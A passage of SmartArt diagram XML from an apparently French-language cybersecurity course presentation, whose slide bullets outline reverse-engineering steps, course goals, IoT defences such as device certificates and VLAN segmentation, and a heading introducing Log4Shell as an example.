        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6CBE1F45-1E8C-406E-AAFC-996F079CA266}" type="parTrans" cxnId="{85C149B6-0C26-4778-8608-0434D6637AEC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1BC91165-C926-4D60-9FEA-FB0B4FA2160A}" type="sibTrans" cxnId="{85C149B6-0C26-4778-8608-0434D6637AEC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6218143E-63EB-45B8-B61D-986B17509B59}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Observer les fonctions critiques utilisées.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{344CE581-796C-45B1-A4DE-411E2A8D0990}" type="parTrans" cxnId="{4DAB4D03-6EED-4BCB-B719-6AA3D206DE21}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0B7D81D6-4D6A-416F-AFA0-8FBAC8AA8D1C}" type="sibTrans" cxnId="{4DAB4D03-6EED-4BCB-B719-6AA3D206DE21}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{94A84BB8-A2DB-4101-84A7-91F7BCA00128}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Décodage des chaînes.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1B5BB98E-BFE1-412B-A756-D3AC1FD3F1B7}" type="parTrans" cxnId="{399AB1CE-218D-40F7-9A9D-EF9E5BB7BE20}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E39C58DE-F5DC-4743-A854-C16A59EFEE10}" type="sibTrans" cxnId="{399AB1CE-218D-40F7-9A9D-EF9E5BB7BE20}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4CC5D6A3-EF24-4F2D-8EE1-F9587C20FEC6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Identifier les clés ou données cachées.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B95D08A7-60F1-4FFF-9D4D-8C20C7BDA565}" type="parTrans" cxnId="{68B11C98-042C-4AFF-A818-964DA7C490E6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C85FA418-EBF7-4AB8-970D-81D6040133F1}" type="sibTrans" cxnId="{68B11C98-042C-4AFF-A818-964DA7C490E6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{89FDC0B5-F084-4AAC-BCA1-161F95225A6C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Analyse de la logique.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{92F785FF-614F-4DBC-A43E-D427FC8C6E17}" type="parTrans" cxnId="{9456C4E9-60EA-48CF-9319-1D9C394E5F07}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C960A183-886E-4D70-BCC3-4A198148E2A4}" type="sibTrans" cxnId="{9456C4E9-60EA-48CF-9319-1D9C394E5F07}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{FF92793D-42E2-4A72-8A40-C20F0CC80D22}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Reverser des algorithmes (chiffrement, compression).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{956FC5F5-729B-4C5B-B709-4DB4E8710B98}" type="parTrans" cxnId="{62242A48-7B02-40A1-B587-F0BAEC2D2749}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5121615F-69BE-4752-9B5C-208A8E7D224B}" type="sibTrans" cxnId="{62242A48-7B02-40A1-B587-F0BAEC2D2749}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4C985B83-95C8-8542-9B77-606BAD37D614}" type="pres">
      <dgm:prSet presAssocID="{5B29E401-8DD4-4B97-B709-6B979915F648}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{30CC7E85-3766-FF45-9935-A44C62CDEB44}" type="pres">
      <dgm:prSet presAssocID="{EB7FE655-9026-4506-A258-9584F8F54CD6}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{05214B6C-CCD1-6949-8AE0-63B196FCDBC8}" type="pres">
      <dgm:prSet presAssocID="{EB7FE655-9026-4506-A258-9584F8F54CD6}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{30D79FC0-C01B-4C4D-BEC0-76C1A83A1BB2}" type="pres">
      <dgm:prSet presAssocID="{EB7FE655-9026-4506-A258-9584F8F54CD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984EFCA-A871-BD4C-9195-ABC3246B7369}" type="pres">
      <dgm:prSet presAssocID="{EB7FE655-9026-4506-A258-9584F8F54CD6}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{3FE1D0DF-D46E-1546-83A9-8A437D21AC1F}" type="pres">
      <dgm:prSet presAssocID="{EB7FE655-9026-4506-A258-9584F8F54CD6}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7F3A63A7-0ED1-0845-96CE-C41EEE13CABD}" type="pres">
      <dgm:prSet presAssocID="{1BC91165-C926-4D60-9FEA-FB0B4FA2160A}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{99AD2E1E-A41C-F64D-A0C8-ECE64A1C897D}" type="pres">
      <dgm:prSet presAssocID="{94A84BB8-A2DB-4101-84A7-91F7BCA00128}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5019DEB2-D921-4446-A53E-E225EE0483E9}" type="pres">
      <dgm:prSet presAssocID="{94A84BB8-A2DB-4101-84A7-91F7BCA00128}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{122098E4-D990-224F-84F6-59BB8A95FDB1}" type="pres">
      <dgm:prSet presAssocID="{94A84BB8-A2DB-4101-84A7-91F7BCA001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0FDF834-B16D-684A-AE6B-01B98B948C83}" type="pres">
      <dgm:prSet presAssocID="{94A84BB8-A2DB-4101-84A7-91F7BCA00128}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B71B6B79-AB4C-094E-9496-D4C0D449B1FB}" type="pres">
      <dgm:prSet presAssocID="{94A84BB8-A2DB-4101-84A7-91F7BCA00128}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="1" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F9F5711C-ADD6-024A-8EF7-54244E60A7F3}" type="pres">
      <dgm:prSet presAssocID="{E39C58DE-F5DC-4743-A854-C16A59EFEE10}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{4B159512-3334-0B45-A6BA-461D0B1F716B}" type="pres">
      <dgm:prSet presAssocID="{89FDC0B5-F084-4AAC-BCA1-161F95225A6C}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{572E0497-2C51-9842-82BB-B47EE9B301AF}" type="pres">
      <dgm:prSet presAssocID="{89FDC0B5-F084-4AAC-BCA1-161F95225A6C}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C2512DD6-937F-0243-BCFF-3AA7FD29C507}" type="pres">
      <dgm:prSet presAssocID="{89FDC0B5-F084-4AAC-BCA1-161F95225A6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29538C3-6E4D-3043-A7AD-F77EA67F7AFF}" type="pres">
      <dgm:prSet presAssocID="{89FDC0B5-F084-4AAC-BCA1-161F95225A6C}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C2E22E09-6AA2-F144-B3F4-5DDC49AD4DCD}" type="pres">
      <dgm:prSet presAssocID="{89FDC0B5-F084-4AAC-BCA1-161F95225A6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DAB4D03-6EED-4BCB-B719-6AA3D206DE21}" srcId="{EB7FE655-9026-4506-A258-9584F8F54CD6}" destId="{6218143E-63EB-45B8-B61D-986B17509B59}" srcOrd="0" destOrd="0" parTransId="{344CE581-796C-45B1-A4DE-411E2A8D0990}" sibTransId="{0B7D81D6-4D6A-416F-AFA0-8FBAC8AA8D1C}"/>
    <dgm:cxn modelId="{21A8C432-1E75-D645-9D99-67F6A697EDE5}" type="presOf" srcId="{5B29E401-8DD4-4B97-B709-6B979915F648}" destId="{4C985B83-95C8-8542-9B77-606BAD37D614}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{62242A48-7B02-40A1-B587-F0BAEC2D2749}" srcId="{89FDC0B5-F084-4AAC-BCA1-161F95225A6C}" destId="{FF92793D-42E2-4A72-8A40-C20F0CC80D22}" srcOrd="0" destOrd="0" parTransId="{956FC5F5-729B-4C5B-B709-4DB4E8710B98}" sibTransId="{5121615F-69BE-4752-9B5C-208A8E7D224B}"/>
    <dgm:cxn modelId="{D93D7B53-3F74-964F-8521-F01BA522D88E}" type="presOf" srcId="{94A84BB8-A2DB-4101-84A7-91F7BCA00128}" destId="{5019DEB2-D921-4446-A53E-E225EE0483E9}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{69431955-54EB-DF47-825C-40985D0B1F76}" type="presOf" srcId="{6218143E-63EB-45B8-B61D-986B17509B59}" destId="{3FE1D0DF-D46E-1546-83A9-8A437D21AC1F}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8248ED8E-00F5-6349-A2EA-2D36F0CD17EB}" type="presOf" srcId="{EB7FE655-9026-4506-A258-9584F8F54CD6}" destId="{30D79FC0-C01B-4C4D-BEC0-76C1A83A1BB2}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{68B11C98-042C-4AFF-A818-964DA7C490E6}" srcId="{94A84BB8-A2DB-4101-84A7-91F7BCA00128}" destId="{4CC5D6A3-EF24-4F2D-8EE1-F9587C20FEC6}" srcOrd="0" destOrd="0" parTransId="{B95D08A7-60F1-4FFF-9D4D-8C20C7BDA565}" sibTransId="{C85FA418-EBF7-4AB8-970D-81D6040133F1}"/>
    <dgm:cxn modelId="{572551A1-589E-7141-AF72-4CEDB6B3AFEC}" type="presOf" srcId="{89FDC0B5-F084-4AAC-BCA1-161F95225A6C}" destId="{C2512DD6-937F-0243-BCFF-3AA7FD29C507}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{454E1EA2-36CC-C04F-B3BF-E8C1579A77F8}" type="presOf" srcId="{EB7FE655-9026-4506-A258-9584F8F54CD6}" destId="{05214B6C-CCD1-6949-8AE0-63B196FCDBC8}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{FEA34FA9-27A3-BE4D-A14A-16DAEB6E91F0}" type="presOf" srcId="{89FDC0B5-F084-4AAC-BCA1-161F95225A6C}" destId="{572E0497-2C51-9842-82BB-B47EE9B301AF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{7486C9AC-DB4F-A145-ACCE-F127132F0A8F}" type="presOf" srcId="{4CC5D6A3-EF24-4F2D-8EE1-F9587C20FEC6}" destId="{B71B6B79-AB4C-094E-9496-D4C0D449B1FB}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{85C149B6-0C26-4778-8608-0434D6637AEC}" srcId="{5B29E401-8DD4-4B97-B709-6B979915F648}" destId="{EB7FE655-9026-4506-A258-9584F8F54CD6}" srcOrd="0" destOrd="0" parTransId="{6CBE1F45-1E8C-406E-AAFC-996F079CA266}" sibTransId="{1BC91165-C926-4D60-9FEA-FB0B4FA2160A}"/>
    <dgm:cxn modelId="{FE8BDCBF-10D4-4045-BBF2-C1F6139A8DAA}" type="presOf" srcId="{94A84BB8-A2DB-4101-84A7-91F7BCA00128}" destId="{122098E4-D990-224F-84F6-59BB8A95FDB1}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{399AB1CE-218D-40F7-9A9D-EF9E5BB7BE20}" srcId="{5B29E401-8DD4-4B97-B709-6B979915F648}" destId="{94A84BB8-A2DB-4101-84A7-91F7BCA00128}" srcOrd="1" destOrd="0" parTransId="{1B5BB98E-BFE1-412B-A756-D3AC1FD3F1B7}" sibTransId="{E39C58DE-F5DC-4743-A854-C16A59EFEE10}"/>
    <dgm:cxn modelId="{9456C4E9-60EA-48CF-9319-1D9C394E5F07}" srcId="{5B29E401-8DD4-4B97-B709-6B979915F648}" destId="{89FDC0B5-F084-4AAC-BCA1-161F95225A6C}" srcOrd="2" destOrd="0" parTransId="{92F785FF-614F-4DBC-A43E-D427FC8C6E17}" sibTransId="{C960A183-886E-4D70-BCC3-4A198148E2A4}"/>
    <dgm:cxn modelId="{AC5D4FF9-7875-914A-B855-05D6AF248C81}" type="presOf" srcId="{FF92793D-42E2-4A72-8A40-C20F0CC80D22}" destId="{C2E22E09-6AA2-F144-B3F4-5DDC49AD4DCD}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{22DA5E99-64FB-7743-8FB4-FC3CE5491311}" type="presParOf" srcId="{4C985B83-95C8-8542-9B77-606BAD37D614}" destId="{30CC7E85-3766-FF45-9935-A44C62CDEB44}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{77DA2D94-C57A-C64F-ADA7-D359FB5FED4A}" type="presParOf" srcId="{30CC7E85-3766-FF45-9935-A44C62CDEB44}" destId="{05214B6C-CCD1-6949-8AE0-63B196FCDBC8}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{DFA46269-2307-BF47-BFCE-046080798B7D}" type="presParOf" srcId="{30CC7E85-3766-FF45-9935-A44C62CDEB44}" destId="{30D79FC0-C01B-4C4D-BEC0-76C1A83A1BB2}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D0EB37A0-D165-8D41-9A04-5CE5A36F9838}" type="presParOf" srcId="{4C985B83-95C8-8542-9B77-606BAD37D614}" destId="{C984EFCA-A871-BD4C-9195-ABC3246B7369}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{B5DCE8A7-D835-994B-8B27-37AC70009198}" type="presParOf" srcId="{4C985B83-95C8-8542-9B77-606BAD37D614}" destId="{3FE1D0DF-D46E-1546-83A9-8A437D21AC1F}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{ED9AF09B-E025-584E-B663-290171CB114E}" type="presParOf" srcId="{4C985B83-95C8-8542-9B77-606BAD37D614}" destId="{7F3A63A7-0ED1-0845-96CE-C41EEE13CABD}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{A240F73D-DD5F-4B40-9623-7AA6A478E16E}" type="presParOf" srcId="{4C985B83-95C8-8542-9B77-606BAD37D614}" destId="{99AD2E1E-A41C-F64D-A0C8-ECE64A1C897D}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C4CC8359-AB04-EA4F-9C96-248AC5599BFE}" type="presParOf" srcId="{99AD2E1E-A41C-F64D-A0C8-ECE64A1C897D}" destId="{5019DEB2-D921-4446-A53E-E225EE0483E9}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C3063DDB-E4B6-DD4C-B744-718B7F5F4B9B}" type="presParOf" srcId="{99AD2E1E-A41C-F64D-A0C8-ECE64A1C897D}" destId="{122098E4-D990-224F-84F6-59BB8A95FDB1}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{592896EB-B2C6-CC42-A81E-916C62109EF2}" type="presParOf" srcId="{4C985B83-95C8-8542-9B77-606BAD37D614}" destId="{50FDF834-B16D-684A-AE6B-01B98B948C83}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{634F1D5E-031C-7347-9E76-63645B106A0E}" type="presParOf" srcId="{4C985B83-95C8-8542-9B77-606BAD37D614}" destId="{B71B6B79-AB4C-094E-9496-D4C0D449B1FB}" srcOrd="6" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{B8AAF89C-02F7-6749-B40D-D19B6D26DEBF}" type="presParOf" srcId="{4C985B83-95C8-8542-9B77-606BAD37D614}" destId="{F9F5711C-ADD6-024A-8EF7-54244E60A7F3}" srcOrd="7" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{57B46766-5476-774D-B144-E9D5ED74119E}" type="presParOf" srcId="{4C985B83-95C8-8542-9B77-606BAD37D614}" destId="{4B159512-3334-0B45-A6BA-461D0B1F716B}" srcOrd="8" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{3106CA59-F32C-7342-BAE9-155E767C2830}" type="presParOf" srcId="{4B159512-3334-0B45-A6BA-461D0B1F716B}" destId="{572E0497-2C51-9842-82BB-B47EE9B301AF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0E58B423-CBAF-4545-B52C-2CFC2C22E785}" type="presParOf" srcId="{4B159512-3334-0B45-A6BA-461D0B1F716B}" destId="{C2512DD6-937F-0243-BCFF-3AA7FD29C507}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{14126C0B-4FFB-F34B-92AA-D53695DD7C6E}" type="presParOf" srcId="{4C985B83-95C8-8542-9B77-606BAD37D614}" destId="{329538C3-6E4D-3043-A7AD-F77EA67F7AFF}" srcOrd="9" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C97785BC-EFBD-2C42-8DB4-BC34D80491C5}" type="presParOf" srcId="{4C985B83-95C8-8542-9B77-606BAD37D614}" destId="{C2E22E09-6AA2-F144-B3F4-5DDC49AD4DC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7BCE7-244B-3948-B06B-F0288137E3B3}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="737759"/>
          <a:ext cx="5334000" cy="914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Comprendre le contexte actuel des menaces en cybersécurité.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="44664" y="782423"/>
        <a:ext cx="5244672" cy="825612"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{8F5F0304-971C-D34D-B47B-3E32AF3444F2}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1718939"/>
          <a:ext cx="5334000" cy="914940"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-502537"/>
            <a:satOff val="-311"/>
            <a:lumOff val="2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Explorer les dernières techniques d’attaques et de défense.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="44664" y="1763603"/>
        <a:ext cx="5244672" cy="825612"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{C68DDC48-E102-574C-935E-753C6EC7DB97}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2700119"/>
          <a:ext cx="5334000" cy="914940"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-1005073"/>
            <a:satOff val="-621"/>
            <a:lumOff val="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Comprendre les bases de l’architecture logicielle (C, assembleur).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="44664" y="2744783"/>
        <a:ext cx="5244672" cy="825612"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{F8D41395-5687-B94D-9E02-F150C1832140}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3681299"/>
          <a:ext cx="5334000" cy="91494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Préparer le terrain pour la manipulation de vulnérabilités.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="44664" y="3725963"/>
        <a:ext cx="5244672" cy="8256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5CE5C-8F28-4258-8179-7B3C628AD1DF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="797491" y="758785"/>
          <a:ext cx="1228411" cy="12284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B43EB-5A37-4337-8B22-6F3D71F11C45}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="46794" y="2331214"/>
          <a:ext cx="27298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Authentification renforcée :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="1400" kern="1200"/>
            <a:t>Utilisation de certificats numériques pour chaque appareil.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1400" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="46794" y="2331214"/>
        <a:ext cx="2729804" cy="720000"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{9E942A9D-B9BE-4918-B117-070E115AEB0C}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="4005011" y="758785"/>
          <a:ext cx="1228411" cy="12284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956B0-1B85-4A89-B3FB-1583D8EA8674}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="3254314" y="2331214"/>
          <a:ext cx="27298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Mises à jour automatisées :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="1400" kern="1200"/>
            <a:t>Déploiement continu de correctifs via OTA (Over-The-Air).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1400" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="3254314" y="2331214"/>
        <a:ext cx="2729804" cy="720000"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{A65F9E55-2EE0-43E2-88E2-52971D396432}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="7212531" y="758785"/>
          <a:ext cx="1228411" cy="12284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4E1A8C-572F-4DF0-8FBB-435C70C08CD3}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="6461834" y="2331214"/>
          <a:ext cx="27298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Segmentations réseau :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="1400" kern="1200"/>
            <a:t>Isolation des objets connectés dans des VLAN dédiés.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1400" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="6461834" y="2331214"/>
        <a:ext cx="2729804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65EC94-D663-B94B-93E8-988B344E1DFE}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="12127"/>
          <a:ext cx="5334000" cy="127570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Exemple 1 : Log4Shell (2021)</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="62275" y="74402"/>
        <a:ext cx="5209450" cy="1151152"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{A767A735-0CA9-0641-AD50-B0DF97872CF3}">
